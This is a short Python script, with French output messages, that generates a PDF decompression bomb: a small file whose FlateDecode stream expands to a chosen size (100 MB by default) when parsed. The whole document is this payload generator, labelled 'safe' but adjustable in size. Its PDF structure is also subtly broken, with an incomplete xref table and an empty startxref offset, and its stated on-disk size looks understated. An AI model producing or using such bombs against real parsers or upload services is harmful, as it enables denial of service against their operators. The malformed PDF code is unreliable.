import zlib

def generate_safe_pdf_bomb(output_filename, expansion_size_mb=100):
    """
    Generates a valid minimal PDF containing a deeply compressed stream.
    The file will be very small on disk (~10 KB to ~50 KB) but will decompress
    to the specified size (default: 100 MB) when a PDF parser reads its text stream.
    """
    # 1. Create a massive repetitive text block (100MB of repeating "A " patterns)
    # Repeating patterns compress extremely well using deflate/zlib algorithm
    raw_data = b"A " * (expansion_size_mb * 512 * 1024) # 100 MB
    
    # 2. Compress the data using zlib deflate compression
    compressed_data = zlib.compress(raw_data)
    
    # 3. Build a minimal valid PDF structure with the compressed stream
    pdf_objects = []
    
    # Header
    pdf_content = b"%PDF-1.4\n"
    
    # Object 1: Catalog
    pdf_content += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    
    # Object 2: Pages
    pdf_content += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    
    # Object 3: Page Leaf (containing references to the content stream)
    pdf_content += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n"
    
    # Object 4: The Decompression Stream (our safe bomb!)
    # It declares that it's compressed using /FlateDecode (standard PDF deflate compression)
    stream_header = f"4 0 obj\n<< /Length {len(compressed_data)} /Filter /FlateDecode >>\nstream\n".encode('ascii')
    stream_footer = b"\nendstream\nendobj\n"
    
    pdf_content += stream_header + compressed_data + stream_footer
    
    # Footer
    pdf_content += b"xref\n0 5\n0000000000 65535 f \n"
    pdf_content += b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%%EOF\n"
    
    with open(output_filename, "wb") as f:
        f.write(pdf_content)
        
    print(f"=== GÉNÉRATION DU PDF BOMB REUSSIE ===")
    print(f"Fichier généré : {output_filename}")
    print(f"Taille sur le disque : {len(pdf_content) / 1024:.2f} Ko")
    print(f"Taille après décompression : {expansion_size_mb} Mo")

if __name__ == "__main__":
    generate_safe_pdf_bomb("safe_bomb_100mb.pdf", expansion_size_mb=100)
